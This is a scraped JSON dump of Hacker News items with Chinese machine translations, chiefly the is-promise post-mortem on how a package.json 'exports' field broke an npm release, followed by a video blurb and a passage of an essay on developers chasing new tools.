[{"category": "", "categoryclass": "", "imagename": "14d6980cbc4158aa7b4f8f80a6406135.png", "infoid": 1000704, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u4e0a\u5468\u516d\uff0c\u6211\u51b3\u5b9a\u8bd5\u7740\u8d76\u4e0a\u6211\u7684\u5f00\u6e90\u9879\u76ee\u4e2d\u7684\u4e00\u4e9b\u8d21\u732e\u3002\u6211\u51b3\u5b9a\u5408\u5e76\u7684\u7b2c\u4e00\u4e2a\u62c9\u8bf7\u6c42\u4e4b\u4e00\u662f\u5411IS-Promise\u6dfb\u52a0\u4e00\u4e2a\u6253\u5b57\u58f0\u660e\u6587\u4ef6\u3002\n\u5408\u5e76\u4e4b\u540e\uff0c\u6211\u51b3\u5b9a\u73b0\u5728\u4e5f\u662f\u66f4\u65b0\u6a21\u5757\u4ee5\u652f\u6301ES\u6a21\u5757\u6837\u5f0f\u5bfc\u5165\u7684\u597d\u65f6\u673a\u3002\u5177\u4f53\u5730\u8bf4\uff0c\u6211\u5e0c\u671b\u80fd\u591f\u4eceIS-Promise\u5bfc\u5165isPromise\uff0c\u800c\u65e0\u9700\u542f\u7528\u5408\u6210\u9ed8\u8ba4\u5bfc\u5165\u3002\u5728\u6b64\u4e4b\u540e\uff0c\u6211\u8fd0\u884c\u4e86\u6d4b\u8bd5\uff0c\u6d4b\u8bd5\u901a\u8fc7\u4e86\uff0c\u5e76\u53d1\u5e03\u4e86\u4e00\u4e2a\u65b0\u7248\u672c\u3002\n\u6211\u4e00\u76f4\u6253\u7b97\u5c06\u6211\u7684\u66f4\u591a\u9879\u76ee\u8bbe\u7f6e\u4e3a\u901a\u8fc7CI\u81ea\u52a8\u53d1\u5e03\uff0c\u800c\u4e0d\u662f\u4ece\u672c\u5730\u673a\u5668\u624b\u52a8\u53d1\u5e03\uff0c\u4f46\u7531\u4e8eIS-Promise\u662f\u4e00\u4e2a\u5982\u6b64\u5c0f\u7684\u5e93\uff0c\u6211\u8ba4\u4e3a\u53ef\u80fd\u4e0d\u503c\u5f97\u8fd9\u4e48\u505a\u3002\u8fd9\u7edd\u5bf9\u662f\u4e2a\u9519\u8bef\u3002\u7136\u800c\uff0c\u5373\u4f7f\u6211\u8bbe\u7f6e\u4e86\u901a\u8fc7CI IS-Promise\u53d1\u5e03\uff0c\u4e5f\u53ef\u80fd\u6ca1\u6709\u8fdb\u884c\u8db3\u591f\u5f7b\u5e95\u7684\u6d4b\u8bd5\u3002\n\u56e0\u4e3a\u5b58\u50a8\u5e93\u6709\u4e00\u4e2a.npmgnore\u6587\u4ef6\uff0c\u6240\u4ee5\u6211\u5047\u8bbe\u5b83\u5728Package.json\u4e2d\u4e0d\u4f1a\u6709\u4e00\u4e2a&#34\uff1bfiles&#34\uff1b\u6570\u7ec4\uff0c\u6240\u4ee5\u6211\u6ca1\u6709\u66f4\u65b0\u8be5\u6570\u7ec4\u4ee5\u5305\u62ec\u65b0\u7684index.mjs\u6587\u4ef6\u3002\n\u5728\u5c06&#34\uff1bExports&#34\uff1b\u5b57\u6bb5\u6dfb\u52a0\u5230Package.json\u4ee5\u544a\u77e5\u8f83\u65b0\u7248\u672c\u7684node.js\u6709\u5173ES\u6a21\u5757\u7248\u672c\u65f6\uff0c\u6211\u5047\u8bbe\u8def\u5f84\u7684\u5de5\u4f5c\u65b9\u5f0f\u4e0e&#34\uff1bmain&#34\uff1b\u76f8\u540c\uff0c\u4f46\u5b83\u4eec\u9700\u8981./\u524d\u7f00\u3002\n\u6211\u4e0d\u77e5\u9053&#34\uff1bExports&#34\uff1b\u5b57\u6bb5to Package.json\u4e0d\u4ec5\u9650\u5236\u60a8\u53ef\u4ee5\u5bfc\u5165\u7684\u5185\u5bb9\uff0c\u800c\u4e14\u9650\u5236\u60a8\u5bfc\u5165\u5b83\u7684\u65b9\u5f0f\u3002\u56e0\u6b64\uff0c\u5373\u4f7f\u6211\u7684\u66f4\u6539\u5141\u8bb8\u60a8\u5bfc\u5165index.js\u6587\u4ef6\uff0c\u5982\u679c\u60a8\u6267\u884c\u7684\u662fRequired(&#39\uff1bis-Promise/index&#39\uff1b)\u6216Required(&#39\uff1bis-Promise/index.js&#39\uff1b)\uff0c\u4e5f\u4f1a\u7834\u574f\u60a8\u7684\u4ee3\u7801\u3002\n\u6211\u4e5f\u6ca1\u6709\u8003\u8651\u5230Package.json\u4e2d\u7684&#34\uff1bExports&#34\uff1b\u5b57\u6bb5\u963b\u6b62\u60a8\u5bfc\u5165Required(&#39\uff1bis-Promise/Package.json&#39\uff1b)\u3002\n\u4ece\u957f\u8fdc\u6765\u770b\uff0c\u51fa\u53e3\u9650\u5236\u53ef\u80fd\u662f\u597d\u7684\uff0c\u4f46\u5b83\u4eec\u786e\u5b9e\u9700\u8981\u6d4b\u8bd5\uff0c\u4ed6\u4eec\u4f7f\u8fd9\u4e00\u70b9\u53d1\u751f\u4e86\u7a81\u7834\u6027\u7684\u53d8\u5316\u3002\n2020-04-25T15\uff1a03\uff1a25Z-I\u53d1\u5e03\u4e86IS-Promise\u7684\u7834\u788e\u7248\u672c\u3002\u4e3b\u8981\u95ee\u9898\u662fPackage.json\u4e2d\u7684&#34\uff1bExports&34\uff1b\u5b57\u6bb5\u3002\n2020-04-25T17\uff1a16\uff1a00Z-Ryan Zimmerman\u63d0\u4ea4\u4e86\u4e00\u4e2a\u62c9\u53d6\u8bf7\u6c42\uff0c\u4e3a\u5927\u591a\u6570\u4eba\u89e3\u51b3\u4e86\u95ee\u9898\u3002\n2020-04-25T17\uff1a48\uff1a00Z-\u6211\u6536\u5230\u4e00\u6761Facebook\u6d88\u606f\uff0c\u8981\u6c42\u6211\u67e5\u770bGitHub\u3002\u8fd9\u662f\u6211\u610f\u8bc6\u5230\u6709\u4e9b\u4e0d\u5bf9\u52b2\u7684\u7b2c\u4e00\u70b9\u3002\n2020-04-25T17\uff1a54\uff1a00Z-I\u5408\u5e76\u5e76\u91ca\u653eRyan\u7684\u62c9\u53d6\u8bf7\u6c42\u3002\u5bf9\u4e8e\u5927\u591a\u6570\u4eba\u6765\u8bf4\uff0c\u8fd9\u4fee\u590d\u4e86\u5e93\uff0c\u4f46\u8bb8\u591a\u4eba\u4ecd\u7136\u6709\u7f13\u5b58\u7684\u7248\u672c\uff0c\u6709\u4e9b\u4eba\u901a\u8fc7&#34\uff1b\u5bfc\u51fa&#34\uff1b\u5728Package.json\u4e2d\u73b0\u5728\u963b\u6b62\u7684\u5947\u602a\u8def\u5f84\u5bfc\u5165\u3002\n2020-04-25T17\uff1a57\uff1a00Z-\u5728\u9605\u8bfb\u4e86\u5404\u79cd\u95ee\u9898\u8bc4\u8bba\u540e\uff0c\u6211\u5c06\u5b83\u4eec\u5168\u90e8\u5173\u95ed\uff0c\u5e76\u521b\u5efa\u4e86\u4e00\u5f20\u65b0\u7684\u7f5a\u5355\uff0c\u4ee5\u4fbf\u6211\u4eec\u53ef\u4ee5\u8fdb\u884c\u66f4\u6709\u6210\u6548\u7684\u8ba8\u8bba\u3002\n2020-04-25T18\uff1a06\uff1a00Z-\u4e54\u4e39\u00b7\u54c8\u73ed\u5fb7\u5411\u6211\u89e3\u91ca\u4e3a\u4ec0\u4e48\u51fa\u53e3\u4ecd\u7136\u662f\u4e00\u4e2a\u7a81\u7834\u6027\u7684\u53d8\u5316\u3002\n2020-04-25T18\uff1a08\uff1a08Z-I\u4ecePackage.json\u4e2d\u5b8c\u5168\u5220\u9664&#34\uff1bexports&#34\uff1b\u5e76\u53d1\u5e03\u4fee\u590d\u7248\u672c\u3002\n2020-04-25T19\uff1a20\uff1a00Z-I\u53d6\u6d88\u53d1\u5e03\u635f\u574f\u7684\u7248\u672c\uff0c\u8bd5\u56fe\u5f3a\u5236\u62e5\u6709\u9501\u5b9a\u6587\u4ef6\u7684\u4efb\u4f55\u4eba\u4ece\u8fd9\u4e9b\u7248\u672c\u8fdb\u884c\u66f4\u65b0\u3002\n\u4ece\u6211\u7684\u672c\u5730\u673a\u5668\u91ca\u653e\u603b\u662f\u8ba9\u4eba\u5fcd\u4e0d\u4f4f\u8df3\u8fc7\u521b\u5efa\u62c9\u8bf7\u6c42\u548c\u8ba9CI\u6d4b\u8bd5\u6211\u7684\u66f4\u6539\u7684\u91cd\u8981\u6b65\u9aa4\u3002\n\u6211\u4eec\u7684\u6d4b\u8bd5\u53ea\u8986\u76d6\u4e86\u5b9e\u9645\u7684\u4ee3\u7801\uff0c\u6ca1\u6709\u68c0\u67e5\u53d1\u5e03\u5230NPM\u7684\u5185\u5bb9\u3002\n\u5728\u8fd9\u8d77\u4e8b\u4ef6\u4e2d\uff0c\u6211\u5e76\u4e0d\u5bb9\u6613\u8054\u7cfb\u5230\u3002\u5c3d\u7ba1GitHub\u5b58\u50a8\u5e93\u4e0a\u6709\u591a\u4e2a\u8d21\u732e\u8005\uff0c\u4f46\u4ed6\u4eec\u6ca1\u6709\u90e8\u7f72\u65b0\u7248\u672c\u7684\u6743\u9650\u3002\n\u5728\u8fd9\u4ef6\u4e8b\u4e4b\u540e\uff0c\u6211\u51b3\u5b9a\u628a\u4e00\u5207\u90fd\u8bbe\u7f6e\u5f97\u5c3d\u53ef\u80fd\u5065\u58ee\u3002\u6211\u8fd8\u51b3\u5b9a\uff0c\u6700\u5b89\u5168\u7684\u505a\u6cd5\u662f\u5c06\u6240\u6709\u8fd9\u4e9b\u66f4\u6539\u4f5c\u4e3a\u65b0\u7684\u4e3b\u8981\u7248\u672c\u53d1\u5e03\uff0c\u4ee5\u907f\u514d\u7834\u574f\u4eba\u4eec\u7684\u4e1c\u897f\uff0c\u5373\u4f7f\u4ed6\u4eec\u6b63\u5728\u4f7f\u7528\u672a\u8bb0\u5f55\u7684\u65b9\u6cd5\u8fdb\u884c\u5bfc\u5165\u3002\n\u5728\u8fc7\u53bb\u7684\u51e0\u4e2a\u6708\u91cc\uff0c\u6211\u4e00\u76f4\u5728\u6784\u5efaRolling Versions\uff0c\u8fd9\u662f\u4e00\u4e2a\u5e2e\u52a9\u60a8\u901a\u8fc7\u6301\u7eed\u96c6\u6210\u5b89\u5168\u5730\u53d1\u5e03\u5305\u4ee5\u53ca\u91cd\u5927\u66f4\u6539\u65e5\u5fd7\u7684\u5de5\u5177\u3002\u6211\u73b0\u5728\u5df2\u7ecf\u5c06\u6b64\u6dfb\u52a0\u5230IS-Promise\u4e2d\uff0c\u8fd9\u7ed9\u4e86\u6211\u5bf9\u672a\u6765\u7248\u672c\u7684\u66f4\u5927\u4fe1\u5fc3\u3002\n\u4ece\u6301\u7eed\u96c6\u6210\u4e2d\u91ca\u653e\u662f\u60a8\u53ef\u4ee5\u505a\u7684\u6700\u91cd\u8981\u7684\u4e8b\u60c5\u4e4b\u4e00\uff0c\u4ee5\u5e2e\u52a9\u9632\u6b62\u7c7b\u4f3c\u7684\u4e8b\u4ef6\u3002\u7f16\u5199\u66f4\u6539\u65e5\u5fd7\u4e5f\u662f\u5e2e\u52a9\u60a8\u68c0\u67e5\u81ea\u5df1\u7684\u66f4\u6539\u5e76\u8003\u8651\u5176\u5f71\u54cd\u7684\u4e00\u79cd\u975e\u5e38\u6709\u6548\u7684\u65b9\u6cd5\u3002\u8fd9\u5b9e\u9645\u4e0a\u53ea\u6709\u5728\u60a8\u5c06\u66f4\u6539\u65e5\u5fd7\u4f5c\u4e3a\u62c9\u5165\u8bf7\u6c42\u7684\u4e00\u90e8\u5206\u5199\u5165\u65f6\u624d\u6709\u6548\uff0c\u800c\u4e0d\u662f\u5728\u4e8b\u540e\u5199\u5165\u66f4\u6539\u65e5\u5fd7\u3002\u5f53\u6211\u4ece\u4e8b\u540e(&lt\uff1b3.0.0)\u7f16\u5199\u5230\u4f5c\u4e3a\u62c9\u8bf7\u6c42(https://github.com/then/is-promise/releases 3.0.0)\u7684\u4e00\u90e8\u5206\u7f16\u5199\u5b83\u4eec\u65f6\uff0c\u60a8\u53ef\u4ee5\u5728\u66f4\u6539\u65e5\u5fd7\u4e2d\u770b\u5230\u8be6\u7ec6\u7684\u589e\u52a0\uff1a\u2265\u3002\n\u5982\u679c\u60a8\u60f3\u4e86\u89e3\u66f4\u591a\u5173\u4e8eRolling Versions\u7684\u4fe1\u606f\uff0c\u6216\u8005\u60f3\u4e86\u89e3\u6211\u5bf9\u8f6f\u4ef6\u5f00\u53d1\u548c\u5f00\u6e90\u7684\u6700\u65b0\u60f3\u6cd5\uff0c\u60a8\u53ef\u4ee5\u5728\u8fd9\u91cc\u8ba2\u9605\u6211\u7684\u90ae\u4ef6\u5217\u8868\uff1a", "note_en": "Last Saturday, I made the decision to try and catch up on some of the many contributions to my open source projects. One of the first pull requests I decided to merge was one that  adds a TypeScript declaration file to is-promise.\n After merging it, I decided it would also be a good time to update the module to  support ES Module style imports. Specifically I wanted to be able to  import isPromise from &#39;is-promise&#39;; without needing to have synthetic default imports enabled. After this, I ran the tests, which passed, and published a new version.\n I had been intending to set up more of my projects to be automatically published via CI, instead of manually published from my local machine, but because is-promise is such a tiny library, I figured it probably wasn\u2019t worth the effort. This was definitely a mistake. However, even if I had setup publishing via CI is-promise may not have had sufficiently thorough tests.\n   Because the repository had a  .npmignore file, I had assumed it wouldn\u2019t have a  &#34;files&#34; array in package.json, so I failed to update that array to include the new  index.mjs file.\n When adding the &#34;exports&#34; field to  package.jsonas a way to tell newer versions of node.js about the ES Modules version, I had assumed the paths worked the same as  &#34;main&#34; but instead they  require the  ./ prefix.\n I had not understood that the &#34;exports&#34; field to  package.jsonrestricts not just  what you can import, but  how you can import it. So even though my change allowed you to import the  index.js file, it would break your code if you were doing  require(&#39;is-promise/index&#39;) or  require(&#39;is-promise/index.js&#39;).\n I also hadn\u2019t considered the fact that the  &#34;exports&#34; field in  package.json prevented you from importing  require(&#39;is-promise/package.json&#39;).\n The restrictions imposed by  &#34;exports&#34;are probably good in the long run, but they really necessitate testing, and they made this a breaking change.\n  2020\u201304\u201325T15:03:25Z \u2014 I published the  broken version of is-promise. The primary issue is the   &#34;exports&#34;  field in package.json\n 2020\u201304\u201325T17:16:00Z \u2014 Ryan Zimmerman  submitted a pull request that fixed things for most people.\n 2020\u201304\u201325T17:48:00Z \u2014 I receive a Facebook message asking me to check GitHub. This is the first point at which I realise something is wrong.\n 2020\u201304\u201325T17:54:00Z \u2014  I merge and release Ryan\u2019s pull request. For the majority of people, this fixes the library, but many people still have cached versions and some people were importing via odd paths that  &#34;exports&#34; in  package.json now blocks.\n 2020\u201304\u201325T17:57:00Z \u2014 Having read through the various issue comments, I close them all and create a  fresh ticket so we can have more productive discussion.\n 2020\u201304\u201325T18:06:00Z \u2014  Jordan Harband explains to me why the  &#34;exports&#34; is still a breaking change.\n 2020\u201304\u201325T18:08:08Z \u2014 I remove  &#34;exports&#34; from  package.json altogether and  release the fixed version\n 2020\u201304\u201325T19:20:00Z \u2014 I un-published the broken versions, in an attempt to force anyone who had lock files to update from them.\n    Releasing from my local machine always makes it tempting to skip the important steps of creating a pull request and letting CI test my changes.\n Our tests only covered the actual code, they did not check what was published to npm.\n  I was not easy to reach during this incident. Although there were multiple contributors on the GitHub repository, they did not have permission to deploy new versions.\n    After this incident, I decided to set everything up to be as robust as I possibly could. I also decided that the safest thing to do was to publish all these changes as a new major version, to avoid breaking things for people even if they were using un-documented approaches to import.\n I\u2019ve spent the last few months building Rolling Versions, which is a tool to help you safely publish packages via continuous integration, along with great change logs. I have now added this to is-promise, which gives me much greater confidence in future releases.\n Releasing from continuous integration is one of the biggest things you can do to help prevent incidents like this. Writing change logs is also a really effective way to help you review your own changes and think about their impact. This is really only effective if you write the change logs as part of the pull request, rather than after the fact. You can see the increase in detail in the change log as I move from writing them as an afterthought (&lt; 3.0.0) to writing them as part of the pull request (\u2265 3.0.0):  https://github.com/then/is-promise/releases\n If you want to know more about Rolling Versions, or would like to be kept up to date on my thoughts on software development and open source, you can subscribe to my mailing list here:", "posttime": "2020-05-05 15:55:42", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "\u627f\u8bfa,post,\u53d1\u5e03,promise", "title": "IS-\u627f\u8bfa\u9a8c\u5c38", "title_en": "Is-Promise Post Mortem", "transed": 1, "url": "https://medium.com/javascript-in-plain-english/is-promise-post-mortem-cab807f18dcc", "via": "", "real_tags": ["\u627f\u8bfa", "post", "\u53d1\u5e03", "promise"]}, {"category": "", "categoryclass": "", "imagename": "ae4befd2f97239901b24f6d009fae155.jpg", "infoid": 1000703, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u6bd4\u6708\u5ca9\u8fd8\u7a00\u6709..\u3002\u6bd4\u949a\u66f4\u81f4\u547d\u3002\u8fd9\u662f\u5c3c\u83ab\u6570\u7801\u663e\u50cf\u7ba1\uff01\u636e\u6211\u6240\u77e5\u8fd9\u662f\u7b2c\u4e00\u6b21\u4e5f\u662f\u552f\u4e00\u4e00\u6b21\u624b\u672f.", "note_en": "Rarer Than A Moon Rock.... Deadlier Than Plutonium... It's The NIMO Digital Display Tube! As far as I know this is the first and only time that an operationa...", "posttime": "2020-05-05 15:55:38", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "nimo,\u6570\u7801,moon", "title": "\u5de5\u4f5c\u5c3c\u83ab\u7ba1(2017)[\u89c6\u9891]", "title_en": "Working Nimo Tube (2017) [video]", "transed": 1, "url": "https://www.youtube.com/watch?v=xmWg7CtN0Ac", "via": "", "real_tags": ["nimo", "\u6570\u7801", "moon"]}, {"category": "", "categoryclass": "", "imagename": "", "infoid": 1000702, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u6211\u7ecf\u5e38\u8ba4\u4e3a\u8f6f\u4ef6\u5f00\u53d1\u4eba\u5458\u5c31\u50cf\u559c\u9e4a\u4e00\u6837\uff0c\u56e0\u4e3a\u5077\u95ea\u95ea\u53d1\u4eae\u7684\u7269\u54c1\u6765\u88c5\u9970\u5b83\u4eec\u590d\u6742\u7684\u5de2\u7a74\u800c\u81ed\u540d\u662d\u8457\u3002\u5c31\u50cf\u559c\u9e4a\u4e00\u6837\uff0c\u8f6f\u4ef6\u5f00\u53d1\u4eba\u5458\u51e0\u4e4e\u6309\u7167\u5b9a\u4e49\u90fd\u662f\u5f02\u5e38\u806a\u660e\u548c\u597d\u5947\u7684\u751f\u7269\u3002\u4f46\u662f\u6211\u4eec\u592a\u5bb9\u6613\u88ab\u95ea\u95ea\u53d1\u5149\u7684\u65b0\u73a9\u5177\u548c\u73a9\u5177\u5206\u5fc3\u4e86\u3002\n\u6211\u4e0d\u518d\u89c9\u5f97Scott Hanselman\u7684\u7ec8\u6781\u5f00\u53d1\u5de5\u5177\u5217\u8868\u5f88\u6709\u542f\u53d1\u6027\u3002\u76f8\u53cd\uff0c\u5b83\u8ba9\u4eba\u75b2\u60eb\u4e0d\u582a\u3002\u8f6f\u4ef6\u4e16\u754c\u7684\u53d8\u5316\u901f\u5ea6\u662f\u65e0\u60c5\u7684\u3002\u6211\u4eec\u88ab\u95ea\u4eae\u7684\u548c\u65b0\u7684\u4e1c\u897f\u6df9\u6ca1\u4e86\uff0c\u4ee5\u81f3\u4e8e\u6982\u5ff5\u672c\u8eab\u5c31\u5f00\u59cb\u74e6\u89e3\uff0c\u8fd9\u4e9b\u8bcd\u4e00\u904d\u53c8\u4e00\u904d\u5730\u91cd\u590d\uff0c\u76f4\u5230\u5b83\u4eec\u6f14\u53d8\u6210\u6beb\u65e0\u610f\u4e49\u7684\u5143\u97f3\u548c\u8f85\u97f3\u3002\u95ea\u4eae\u7684\u548c\u65b0\u7684\u53d8\u5f97\u5e73\u51e1\uff0c\u751a\u81f3\u5e73\u51e1\u3002\u65b0\u7684\u4e1c\u897f\u4e0d\u518d\u662f\u72ec\u4e00\u65e0\u4e8c\u7684\uff0c\u5f53\u4e1c\u897f\u95ea\u95ea\u53d1\u5149\u65f6\uff0c\u5b83\u5c31\u4e0d\u518d\u6709\u8da3\u4e86\u3002\u6700\u7ec8\uff0c\u4f60\u4f1a\u538c\u5026\u6ca1\u5b8c\u6ca1\u4e86\u7684\u95ea\u4eae\u65b0\u4e8b\u7269\u3002\n\u4e00\u5e74\u591a\u524d\uff0c\u6211\u53d6\u6d88\u4e86\u5bf9\u53f2\u8482\u592b\u535a\u5ba2\u7684\u8ba2\u9605\uff0c\u56e0\u4e3a\u4ed6\u6709\u4e00\u4e2a\u4e60\u60ef\uff0c\u5c31\u662f\u6c14\u5598\u5401\u5401\u5730\u5199\u6700\u65b0\u7684\u95ea\u4eae\u7684\u65b0\u4e8b\u7269--\u901a\u5e38\u4e00\u5929\u8981\u5199\u597d\u51e0\u6b21\u3002\u6211\u770b\u5230\u592a\u591a\u6211\u8ba4\u8bc6\u7684\u4eba\u9677\u5165\u4e86\u4ee4\u4eba\u5598\u4e0d\u8fc7\u6c14\u6765\u7684\u7092\u4f5c\u4e2d\uff0c\u5fd8\u8bb0\u4e86\u601d\u8003\u6700\u65b0\u7684\u95ea\u4eae\u65b0\u4e8b\u7269\u662f\u5426\u771f\u7684\u5173\u7cfb\u5230\u6574\u4e2a\u4e8b\u60c5\u7684\u5b8f\u4f1f\u8ba1\u5212\u3002\n[Robert Scoble]\u8bf4\uff0c\u4ed6\u6536\u5230\u7684\u7535\u5b50\u90ae\u4ef6\u592a\u591a\uff0c\u8fd9\u5bf9\u4ed6\u53d1\u5e03\u516c\u5173\u4fe1\u606f\u6765\u8bf4\u662f\u65e0\u6548\u7684\u3002\u4ed6\u5efa\u8bae\u4f60\u73b0\u5728\u5e94\u8be5\u505a\u7684\u662f\u5728\u4ed6\u7684Facebook\u5899\u4e0a\u7ed9\u4ed6\u7559\u8a00\u3002\u4eb2\u7231\u7684\u4e0a\u5e1d\u548c/\u6216\u9c8d\u52c3\u3002\u5728\u6211\u8ddf\u8e2a\u65af\u79d1\u5e03\u5c14\u7684\u90a3\u6bb5\u65f6\u95f4\u91cc\uff0c\u6211\u80af\u5b9a\u4ece\u4ed6\u90a3\u91cc\u770b\u5230\u8fc7\u5341\u51e0\u6b21\u8fd9\u6837\u7684\u4e8b\u60c5\u3002\u522b\u53d1\u7535\u5b50\u90ae\u4ef6\uff0c\u53d1\u63a8\u7279\u7ed9\u6211\u3002\u522b\u53d1\u63a8\u7279\u4e86\uff0c\u5f6d\u65af\u3002\u624d\u9177\u6211\u3002\u5728\u5899\u4e0a\u7559\u8a00\uff0c\u53d1\u77ed\u4fe1\uff0c\u7ed9\u6211\u6253\u7535\u8bdd\uff0c\u7ed9\u6211\u53d1\u7535\u5b50\u90ae\u4ef6\uff0c\u4e0d\u8981\u7ed9\u6211\u53d1\u7535\u5b50\u90ae\u4ef6\uff0c\u4e0d\u8981\u7ed9\u6211\u6253\u7535\u8bdd\u3002\u5df2\u7ecf\u591f\u4e86\uff01\u6211\u751a\u81f3\u4e0d\u60f3\u548c\u4ed6\u8054\u7cfb\uff0c\u6211\u53d1\u73b0\u8fd9\u79cd\u4ece\u4e00\u4e2a\u5e73\u53f0\u5230\u53e6\u4e00\u4e2a\u5e73\u53f0\u7684\u4e0d\u65ad\u8fc1\u79fb\u662f\u4e00\u5806\u72d7\u5c4e\uff0c\u8ba9\u6211\u611f\u5230\u538c\u5026\u3002\u4e00\u5e74\u591a\u524d\uff0c\u5f53\u6211\u653e\u5f03TechCrunch\u65f6\uff0c\u6211\u4e5f\u6709\u540c\u6837\u7684\u611f\u89c9\u3002\u6211\u538c\u5026\u4e86\u542c\u5230\u53e6\u4e00\u79cd\u7565\u5fae\u4e0d\u540c\u7684\u65b9\u5f0f\u6765\u505a\u6211\u4eec\u5df2\u7ecf\u5728\u505a\u7684\u4e8b\u60c5\uff0c\u4ee5\u53ca\u4e3a\u4ec0\u4e48\u8fd9\u4e48\u5fae\u5c0f\u7684\u5dee\u5f02\u503c\u5f97\u653e\u4e0b\u4e00\u5207\uff0c\u642c\u5230\u522b\u5904\u53bb\u3002\u6211\u6b63\u5f0f\u5ba3\u5e03\u653e\u5f03\u5bfb\u627e\u66f4\u65b0\u66f4\u95ea\u4eae\u7684\u4e1c\u897f\u3002\n\u8fd9\u4e0d\u4ec5\u4ec5\u662f\u6ca1\u5b8c\u6ca1\u4e86\u7684\u79d1\u6280\u65b0\u95fb\u3002\u8fd9\u4e5f\u662f\u6570\u4ee5\u5343\u8ba1\u7684\u8f6f\u4ef6\u5b97\u6559\u6218\u4e89\u7684\u6f6e\u6c50\u63a8\u52a8\u548c\u62c9\u52a8\uff0c\u4e0d\u65ad\u5730\u628a\u6211\u4eec\u78e8\u5f97\u7cbe\u75b2\u529b\u7aed\uff0c\u5c31\u50cf\u6025\u6d41\u4e2d\u7684\u8bef\u5165\u6b67\u9014\u7684\u5ca9\u77f3\u3002\u6211\u6562\u6253\u8d4c\uff0c\u5927\u536b\u00b7\u6885\u91d1\u68ee\u6982\u8ff0\u7684\u8fc7\u7a0b\u542c\u8d77\u6765\u975e\u5e38\u719f\u6089\uff1a\n1.\u7cbe\u82f1(\u5927\u5e08)\u5f00\u53d1\u4eba\u5458\u6ce8\u610f\u5230\u4f7f\u7528\u4ed6\u4eec\u5f53\u524d\u7684\u7f16\u7a0b\u8bed\u8a00\u6709\u592a\u591a\u5eb8\u4fd7\u7684\u4e1c\u897f\uff0c\u5e76\u5f00\u59cb\u5bfb\u627e\u80fd\u591f\u66f4\u597d\u5730\u5c06\u4ed6\u4eec\u4e0e\u5e73\u5eb8\u7684\u540c\u4e8b\u533a\u5206\u5f00\u6765\u7684\u4e1c\u897f\u30022.\u7cbe\u82f1\u5f00\u53d1\u4eba\u5458\u62ff\u51fa\u4ed6\u4eec\u5f53\u524d\u70e6\u607c\u7684\u8d2d\u7269\u6e05\u5355\uff0c\u5bfb\u627e\u4e00\u79cd\u65b0\u7684\u3001\u9c9c\u4e3a\u4eba\u77e5\u7684\u8bed\u8a00\uff0c\u663e\u7136\u8fd9\u79cd\u8bed\u8a00\u7684\u6570\u91cf\u66f4\u5c11\u3002\n3.\u7cbe\u82f1\u5f00\u53d1\u4eba\u5458\u5f00\u59cb\u63a8\u52a8\u65b0\u8bed\u8a00\u7684\u5f00\u53d1\uff0c\u8d21\u732e\u4ee3\u7801\u3001\u7f16\u5199\u5e93\u7b49\uff0c\u7136\u540e\u5ba3\u4f20\u65b0\u8bed\u8a00\u3002\u6b21\u7cbe\u82f1(\u9ad8\u7ea7)\u5f00\u53d1\u4eba\u5458\u8ddf\u968f\u7cbe\u82f1\u5f00\u53d1\u4eba\u5458\u5b66\u4e60\u65b0\u8bed\u8a00\uff0c\u4e3a\u56fe\u4e66\u3001\u57f9\u8bad\u7b49\u521b\u9020\u4e86\u5e02\u573a\uff0c\u540c\u65f6\u4e5f\u52a0\u5feb\u4e86\u8be5\u8bed\u8a00\u7684\u5f00\u53d1\u548c\u6d4b\u8bd5\u3002\n4.\u6709\u5de8\u5927\u5f71\u54cd\u529b\u7684\u6b21\u7cbe\u82f1\u5f00\u53d1\u4eba\u5458(\u7cbe\u82f1\u5f00\u53d1\u4eba\u5458\u503e\u5411\u4e8e\u5b64\u7acb\u5730\u4ece\u4e8b\u7814\u7a76\u9879\u76ee\uff0c\u800c\u4e0d\u662f\u751f\u4ea7\u5f00\u53d1\u56e2\u961f)\uff0c\u5f00\u59cb\u5728\u5de5\u4f5c\u573a\u6240\u63a8\u52a8\u65b0\u8bed\u8a00\u7684\u4f7f\u7528\u3002\n5.\u5927\u91cf\u7684\u6b63\u89c4\u5f00\u53d1\u4eba\u5458\u610f\u8bc6\u5230\uff0c\u4ed6\u4eec\u5fc5\u987b\u5f00\u59cb\u8d2d\u4e70\u4e66\u7c4d\u548c\u53c2\u52a0\u8bfe\u7a0b\u6765\u5b66\u4e60\u4e00\u95e8\u65b0\u7684\u8bed\u8a00\u3002\n6.\u7cbe\u82f1\u5f00\u53d1\u4eba\u5458\u6ce8\u610f\u5230\u4f7f\u7528\u4ed6\u4eec\u5f53\u524d\u7684\u7f16\u7a0b\u8bed\u8a00\u6709\u592a\u591a\u5eb8\u4fd7\u7684\u4e1c\u897f\uff0c\u4e8e\u662f\u5f00\u59cb\u5bfb\u627e\u4e00\u4e9b\u80fd\u8ba9\u4ed6\u4eec\u4e0e\u5e73\u5eb8\u7684\u540c\u4e8b\u66f4\u597d\u5730\u533a\u5206\u5f00\u6765\u7684\u4e1c\u897f\u3002\n\u6211\u5e0c\u671b\u4f60\u5750\u4e0b\u6765\uff0c\u56e0\u4e3a\u6211\u6709\u4e00\u4e9b\u574f\u6d88\u606f\u8981\u544a\u8bc9\u4f60\u3002\u4f60\u5bf9Ruby on 